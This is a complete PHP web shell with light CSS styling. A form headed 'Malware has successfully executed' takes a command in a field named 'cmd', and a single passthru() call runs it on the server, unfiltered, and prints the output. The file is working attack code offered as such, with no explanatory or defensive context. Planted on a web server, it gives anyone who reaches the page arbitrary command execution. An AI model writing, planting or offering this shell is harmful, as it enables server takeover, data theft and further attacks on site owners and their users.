<style>
    body {
        background-color: #f2f2f2;
    }

    form {
        background-color: white;
        padding: 20px;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    pre {
        background-color: white;
        padding: 10px;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
</style>

<form action="" method="post">
    <h2>Malware has successfully executed</h2>
    <br>
    Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
</form>

Output:<br />
<pre>
    <?php passthru($_REQUEST['cmd'], $result); ?>
</pre>
